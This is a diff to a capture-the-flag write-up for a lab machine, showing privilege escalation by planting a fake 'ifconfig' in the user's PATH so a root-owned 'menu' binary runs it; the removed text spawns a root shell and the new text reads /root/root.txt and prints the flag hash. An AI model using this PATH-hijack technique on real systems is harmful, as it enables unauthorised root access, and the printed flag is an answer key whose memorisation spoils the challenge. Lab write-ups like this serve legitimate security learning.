@@ -67,30 +67,25 @@ Check readable strings inside the file
        Invalid choice
       ;*3$"
 
-The binary call 3 commands: curl, kernel, ifconfig, without specifing the full path. This allows us to create a malicious version of once of the executed command, e.g. 
-
-    echo "/bin/sh" > ifconfig
-    chmod ugo+x ifconfig 
-Executing the command we get a shell
-
-      kenobi@kenobi:~$ ./ifconfig 
-      $ 
-
-Inspecting the PATH enviroment variable>
+The menu calls 3 commands: curl, kernel, ifconfig, without specifing the full path. This allows us to create a malicious version of once of the executed commands, e.g. ifconfig.
+Inspecting the PATH enviroment variable:
 
     echo $PATH
       /home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
-We can see that the user bin directory is in the PATH, we can just move to this directory our ifconfig:
+We can see that current user bin directory is in the PATH, so we can just create our malicious version of ifconfig inside the user's home bin directory:
 
-    $ pwd
+     pwd
       /home/kenobi
-    $ mkdir bin
-    $ mv ifconfig bin/
-    $ /home/kenobi/bin/ifconfig 
-    $ whoami
-    kenobi
+    mkdir bin
+    cd bin
+    echo "cat /root/root.txt" > ifconfig
+    chmod ugo+x ifconfig 
+Executing the command we get an access error since we don't have the permission to read the flag:
 
-Now exit from the current session and try the exploit:
+      ifconfig 
+      cat: /root/root.txt: Permission denied
+    
+But if we call it using the menu command interface we get the flag:
 
     kenobi@kenobi:~$ menu
     ***************************************
@@ -98,12 +93,9 @@ Now exit from the current session and try the exploit:
     2. kernel version
     3. ifconfig
     ** Enter your choice :3
-    # whoami
-    root
-We got a shell as root
+    177b3cd8562289f37382721c28381f02
 
-
-  
+ 
     
     
 
